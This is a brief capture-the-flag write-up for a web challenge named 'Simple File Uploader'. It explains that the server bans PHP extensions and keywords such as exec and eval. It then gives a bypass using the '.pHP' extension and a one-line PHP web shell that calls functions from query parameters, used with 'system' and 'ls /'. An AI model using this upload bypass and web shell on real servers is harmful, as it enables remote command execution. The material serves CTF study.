# Simple File Uploader
- Category: Web
- Tag: `easy`
- Final Score: 100
- Solve: 92/292

## Writeups :eyes:
### Observation
- The source code ban the specific extname. E.g. `.php`, `.php2`, `.php3`, etc.
- Then, the source code ban some system command on uploaded file content. E.g. `exec`, `passthru`, `eval`, etc.
### Exploit
We can bypass the extname using `.pHP`. Then, we can use payload `<?php $_GET['a']($_GET['b']); ?>` to pass `a=system&b=ls /` to get the flag.